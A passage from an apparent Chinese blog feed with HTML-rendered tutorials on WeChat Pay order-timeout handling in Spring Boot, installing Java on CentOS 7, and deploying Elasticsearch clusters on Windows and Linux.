class="line">               log.info(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               log.info(<span class="string">&quot;Native查单失败,响应码 = &quot;</span> + statusCode + <span class="string">&quot;,返回结果 = &quot;</span> + bodyAsString);</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;request failed&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> bodyAsString;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           response.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="集成Spring-Task"><a href="#集成Spring-Task" class="headerlink" title="集成Spring Task"></a>集成Spring Task</h3><p>Spring 3.0后提供Spring Task实现任务调度，启动类添加注解：<code>@EnableScheduling</code></p><p>在线Cron表达式生成器：<a href="https://cron.qqe2.com/%EF%BC%8C%E5%85%B6%E6%97%B6%E9%97%B4%E6%9C%89**%E5%88%86%E3%80%81%E6%97%B6%E3%80%81%E6%97%A5%E3%80%81%E6%9C%88%E3%80%81%E5%91%A8**%E4%BA%94%E7%A7%8D%EF%BC%8C%E6%93%8D%E4%BD%9C%E7%AC%A6%E6%9C%89">https://cron.qqe2.com/，其时间有**分、时、日、月、周**五种，操作符有</a></p><ul><li>***** 取值范围内的所有数字</li><li><strong>&#x2F;</strong> 每过多少个数字</li><li><strong>-</strong> 从X到Z</li><li><strong>，</strong>散列数字</li></ul><h3 id="定时查找超时订单"><a href="#定时查找超时订单" class="headerlink" title="定时查找超时订单"></a>定时查找超时订单</h3><p>WxPayTask：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.task;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayTask</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayService wxPayService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从第0秒开始每隔30秒执行1次，查询创建超过5分钟，并且未支付的订单</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Scheduled(cron = &quot;0/30 * * * * ?&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">orderConfirm</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;orderConfirm 被执行......&quot;</span>);</span><br><span class="line">        List&lt;OrderInfo&gt; orderInfoList = orderInfoService.getNoPayOrderByDuration(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">for</span> (OrderInfo orderInfo : orderInfoList) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> orderInfo.getOrderNo();</span><br><span class="line">            log.warn(<span class="string">&quot;超时订单 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line">            <span class="comment">//核实订单状态：调用微信支付查单接口</span></span><br><span class="line">            wxPayService.checkOrderStatus(orderNo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OrderInfoServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 找出创建超过minutes分钟并且未支付的订单</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> minutes</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;OrderInfo&gt; <span class="title function_">getNoPayOrderByDuration</span><span class="params">(<span class="type">int</span> minutes)</span> &#123;</span><br><span class="line">    <span class="comment">//minutes分钟之前的时间</span></span><br><span class="line">    <span class="type">Instant</span> <span class="variable">instant</span> <span class="operator">=</span> Instant.now().minus(Duration.ofMinutes(minutes));</span><br><span class="line">    QueryWrapper&lt;OrderInfo&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;order_status&quot;</span>, OrderStatus.NOTPAY.getType());</span><br><span class="line">    queryWrapper.le(<span class="string">&quot;create_time&quot;</span>, instant);</span><br><span class="line">    <span class="keyword">return</span> baseMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="处理超时订单"><a href="#处理超时订单" class="headerlink" title="处理超时订单"></a>处理超时订单</h3><p>WxPayServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据订单号查询微信支付查单接口，核实订单状态</span></span><br><span class="line"><span class="comment"> * 如果订单已支付，则更新商户端订单状态，并记录支付日志</span></span><br><span class="line"><span class="comment"> * 如果订单未支付，则调用关单接口关闭订单，并更新商户端订单状态</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> orderNo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkOrderStatus</span><span class="params">(String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    log.warn(<span class="string">&quot;根据订单号核实订单状态 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line">    <span class="comment">//调用微信支付查单接口</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.queryOrder(orderNo);</span><br><span class="line"></span><br><span class="line">    <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">resultMap</span> <span class="operator">=</span> gson.fromJson(result, HashMap.class);</span><br><span class="line">    <span class="comment">//获取微信支付端的订单状态</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">tradeState</span> <span class="operator">=</span> resultMap.get(<span class="string">&quot;trade_state&quot;</span>);</span><br><span class="line">    <span class="comment">//判断订单状态</span></span><br><span class="line">    <span class="keyword">if</span> (WxTradeState.SUCCESS.getType().equals(tradeState)) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;核实订单已支付 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line">        <span class="comment">//如果确认订单已支付则更新本地订单状态</span></span><br><span class="line">        orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.SUCCESS);</span><br><span class="line">        <span class="comment">//记录支付日志</span></span><br><span class="line">        paymentInfoService.createPaymentInfo(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WxTradeState.NOTPAY.getType().equals(tradeState)) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;核实订单未支付 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果订单未支付，则调用关单接口</span></span><br><span class="line">        <span class="built_in">this</span>.closeOrder(orderNo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//更新本地订单状态</span></span><br><span class="line">        orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.CLOSED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其他API类似，参考官方文档即可。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7安装配置java环境</title>
      <link href="/posts/59553/"/>
      <url>/posts/59553/</url>
      
        <content type="html"><![CDATA[<h1 id="通过yum安装"><a href="#通过yum安装" class="headerlink" title="通过yum安装"></a>通过yum安装</h1><ol><li>查看本地是否自带java环境：<code>java -version</code> 和 <code>yum list installed |grep java</code></li><li>查看yum仓库中的java安装包：<code>yum -y list java*</code></li><li>安装java 1.8版本（可根据yum仓库选择安装）：<code>yum -y install java-1.8.0-openjdk*</code></li><li>配置环境变量，在文件末尾添加：<code>vi /etc/profile</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/java-1.8.0</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre  </span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br></pre></td></tr></table></figure><ol start="5"><li>输入<code>source /etc/profile</code>，使配置立即生效</li><li>输入<code>java -version</code>，检查Java是否安装成功</li></ol><h1 id="通过下载jdk上传安装"><a href="#通过下载jdk上传安装" class="headerlink" title="通过下载jdk上传安装"></a>通过下载jdk上传安装</h1><ol><li>官网下载压缩包：<a href="https://www.oracle.com/java/technologies/downloads/#java8">https://www.oracle.com/java/technologies/downloads/#java8</a></li><li>通过xshell上传jdk安装包 </li><li>解压到指定文件夹：<code>tar -zxvf jdk-8u181-linux-x64.tar.gz -C /opt/java/ </code></li><li>配置环境变量：同上</li><li><code>source /etc/profile</code>，使配置立即生效</li></ol><h1 id="查找Java安装路径"><a href="#查找Java安装路径" class="headerlink" title="查找Java安装路径"></a>查找Java安装路径</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx es]# which java</span><br><span class="line">/usr/bin/java</span><br><span class="line">[root@nanzx es]# ls -lrt /usr/bin/java</span><br><span class="line">lrwxrwxrwx. 1 root root 22 11月 21 17:39 /usr/bin/java -&gt; /etc/alternatives/java</span><br><span class="line">[root@nanzx es]# ls -lrt /etc/alternatives/java</span><br><span class="line">lrwxrwxrwx. 1 root root 73 11月 21 17:39 /etc/alternatives/java -&gt; /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64/jre/bin/java</span><br><span class="line">[root@nanzx es]# cd /usr/lib/jvm</span><br><span class="line">[root@nanzx jvm]# ls</span><br><span class="line">java        java-1.8.0-openjdk                               java-openjdk  jre-1.8.0          jre-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64</span><br><span class="line">java-1.8.0  java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64  jre           jre-1.8.0-openjdk  jre-openjdk</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64</code>是安装目录，也可以直接通过执行<code>java -verbose</code>，最下边会出现安装目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Loaded java.lang.Shutdown$Lock from /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.el7_9.x86_64/jre/lib/rt.jar]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch的集群部署</title>
      <link href="/posts/36216/"/>
      <url>/posts/36216/</url>
      
        <content type="html"><![CDATA[<h1 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h1><h2 id="单机-集群"><a href="#单机-集群" class="headerlink" title="单机 &amp; 集群"></a>单机 &amp; 集群</h2><p>单台 Elasticsearch 服务器提供服务，往往都有最大的负载能力，超过这个阈值，服务器性能就会大大降低甚至不可用，所以生产环境中，一般都是运行在指定服务器集群中。</p><p>除了负载能力，单点服务器也存在其他问题：</p><ul><li><p>单台机器存储容量有限</p></li><li><p>单服务器容易出现单点故障，无法实现高可用</p></li><li><p>单服务的并发处理能力有限</p></li></ul><p>配置服务器集群时，集群中节点数量没有限制，大于等于 2 个节点就可以看做是集群了。一般出于高性能及高可用方面来考虑集群中节点数量都是 3 个以上。</p><h2 id="集群-Cluster"><a href="#集群-Cluster" class="headerlink" title="集群 Cluster"></a>集群 Cluster</h2><p>一个集群就是由一个或多个服务器节点组织在一起，共同持有整个的数据，并一起提供索引和搜索功能。一个 Elasticsearch 集群有一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字来加入这个集群。</p><h2 id="节点-Node"><a href="#节点-Node" class="headerlink" title="节点 Node"></a>节点 Node</h2><p>集群中包含很多服务器，一个节点就是其中的一个服务器。作为集群的一部分，它存储数据，参与集群的索引和搜索功能。</p><p>一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于 Elasticsearch 集群中的哪些节点。</p><p>一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。</p><p>在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何 Elasticsearch 节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。</p><hr><h1 id="Windows集群"><a href="#Windows集群" class="headerlink" title="Windows集群"></a>Windows集群</h1><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>创建 elasticsearch-cluster 文件夹，在内部复制三个 elasticsearch 服务</p><ul><li>node-1001</li><li>node-1002</li><li>node-1003</li></ul><p>修改集群文件目录中每个节点的 config&#x2F;elasticsearch.yml 配置文件</p><p>节点 node-1001 的配置信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#集群名称，节点之间要保持一致</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点名称，集群内要唯一,并设置可以为主节点，存储数据</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1001</span></span><br><span class="line"><span class="attr">node.master:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">node.data:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip 地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="string">localhost</span></span><br><span class="line"><span class="comment">#http 端口</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">1001</span></span><br><span class="line"><span class="comment">#tcp 监听端口</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> <span class="number">9301</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点发现，第一个启动可以不用配置，后面启动的节点要配置寻找节点</span></span><br><span class="line"><span class="comment">#discovery.seed_hosts: [&quot;localhost:9301&quot;, &quot;localhost:9302&quot;,&quot;localhost:9303&quot;]</span></span><br><span class="line"><span class="comment">#discovery.zen.fd.ping_timeout: 1m</span></span><br><span class="line"><span class="comment">#discovery.zen.fd.ping_retries: 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#集群内的可以被选为主节点的节点列表</span></span><br><span class="line"><span class="comment">#cluster.initial_master_nodes: [&quot;node-1001&quot;, &quot;node-1002&quot;,&quot;node-1003&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#跨域配置</span></span><br><span class="line"><span class="comment">#action.destructive_requires_name: true</span></span><br><span class="line"><span class="attr">http.cors.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">http.cors.allow-origin:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><p>节点 node-1002 的配置信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#集群名称，节点之间要保持一致</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点名称，集群内要唯一,并设置可以为主节点，存储数据</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1002</span></span><br><span class="line"><span class="attr">node.master:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">node.data:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip 地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="string">localhost</span></span><br><span class="line"><span class="comment">#http 端口</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">1002</span></span><br><span class="line"><span class="comment">#tcp 监听端口</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> <span class="number">9302</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点发现</span></span><br><span class="line"><span class="attr">discovery.seed_hosts:</span> [<span class="string">&quot;localhost:9301&quot;</span>]</span><br><span class="line"><span class="attr">discovery.zen.fd.ping_timeout:</span> <span class="string">1m</span></span><br><span class="line"><span class="attr">discovery.zen.fd.ping_retries:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#集群内的可以被选为主节点的节点列表</span></span><br><span class="line"><span class="comment">#cluster.initial_master_nodes: [&quot;node-1001&quot;, &quot;node-1002&quot;,&quot;node-1003&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#跨域配置</span></span><br><span class="line"><span class="comment">#action.destructive_requires_name: true</span></span><br><span class="line"><span class="attr">http.cors.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">http.cors.allow-origin:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><p>节点 node-1003 的配置信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#集群名称，节点之间要保持一致</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点名称，集群内要唯一,并设置可以为主节点，存储数据</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1003</span></span><br><span class="line"><span class="attr">node.master:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">node.data:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip 地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="string">localhost</span></span><br><span class="line"><span class="comment">#http 端口</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">1003</span></span><br><span class="line"><span class="comment">#tcp 监听端口</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> <span class="number">9303</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#节点发现</span></span><br><span class="line"><span class="attr">discovery.seed_hosts:</span> [<span class="string">&quot;localhost:9301&quot;</span>, <span class="string">&quot;localhost:9302&quot;</span>]</span><br><span class="line"><span class="attr">discovery.zen.fd.ping_timeout:</span> <span class="string">1m</span></span><br><span class="line"><span class="attr">discovery.zen.fd.ping_retries:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#集群内的可以被选为主节点的节点列表</span></span><br><span class="line"><span class="comment">#cluster.initial_master_nodes: [&quot;node-1001&quot;, &quot;node-1002&quot;,&quot;node-1003&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#跨域配置</span></span><br><span class="line"><span class="comment">#action.destructive_requires_name: true</span></span><br><span class="line"><span class="attr">http.cors.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">http.cors.allow-origin:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><h2 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h2><ol><li>启动前先删除每个节点中的 data 和 logs 目录中所有内容（如果存在）</li><li>分别双击执行 bin&#x2F;elasticsearch.bat, 启动节点服务器，启动后，会自动加入指定名称的集群</li></ol><p>查看集群状态：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211120232055.png"></p><blockquote><p>status 字段指示着当前集群在总体上是否工作正常。它的三种颜色含义如下：</p><ul><li>green：所有的主分片和副本分片都正常运行。</li><li>yellow：所有的主分片都正常运行，但不是所有的副本分片都正常运行。</li><li>red有主分片没能正常运行。</li></ul></blockquote><p>向集群中的 node-1001 节点增加索引：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211120232533.png"></p><p>向集群中的 node-1002 节点查询索引：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211120232647.png"></p><hr><h1 id="Linux单机"><a href="#Linux单机" class="headerlink" title="Linux单机"></a>Linux单机</h1><h2 id="下载解压"><a href="#下载解压" class="headerlink" title="下载解压"></a>下载解压</h2><p>软件下载地址：<a href="https://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-8-0">https://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-8-0</a> </p><p>将下载好的安装包通过 Xftp 工具上传到 Linux上</p><p>将下载的软件解压缩并重命名：</p><ul><li><p><code>tar -zxvf elasticsearch-7.8.0-linux-x86_64.tar.gz -C /opt/</code></p></li><li><p><code>cd /opt/module </code> </p></li><li><p><code>mv elasticsearch-7.8.0 es</code></p></li></ul><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>因为安全问题，Elasticsearch 不允许 root 用户直接运行，所以要创建新用户，在 root 用户中创建新用户：</p><ol><li>新增 es 用户：<code>useradd es</code></li><li>为 es 用户设置密码：<code>passwd es</code></li><li>如果新增错了，可以删除再加：<code>userdel -r es</code></li><li>改变文件夹所有者和群组：<code>chown -R es:es /opt/es</code></li><li>查看文件夹所有者和群组是否更改成功：<code>ls -ll</code></li></ol><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>修改 &#x2F;opt&#x2F;es&#x2F;config&#x2F;elasticsearch.yml  文件，加入如下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster.name:</span> <span class="string">elasticsearch</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9200</span></span><br><span class="line"><span class="attr">cluster.initial_master_nodes:</span> [<span class="string">&quot;node-1&quot;</span>]</span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件，在文件末尾中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个进程可以打开的文件数的限制</span></span><br><span class="line"><span class="string">es</span> <span class="string">soft</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="string">es</span> <span class="string">hard</span> <span class="string">nofile</span> <span class="number">65536</span></span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;20-nproc.conf 文件，在文件末尾中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个进程可以打开的文件数的限制</span></span><br><span class="line"><span class="string">es</span> <span class="string">soft</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="string">es</span> <span class="string">hard</span> <span class="string">nofile</span> <span class="number">65536</span></span><br><span class="line"><span class="comment"># 操作系统级别对每个用户创建的进程数的限制</span></span><br><span class="line"><span class="string">*</span> <span class="string">hard</span> <span class="string">nproc</span> <span class="number">4096</span></span><br><span class="line"><span class="comment"># 注：* 代表 Linux 所有用户名称</span></span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;sysctl.conf 文件，在文件中增加下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个进程可以拥有的 VMA(虚拟内存区域)的数量,默认值为 65536</span></span><br><span class="line"><span class="string">vm.max_map_count=655360</span></span><br></pre></td></tr></table></figure><p><strong>重新加载：</strong><code>sysctl -p </code></p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx 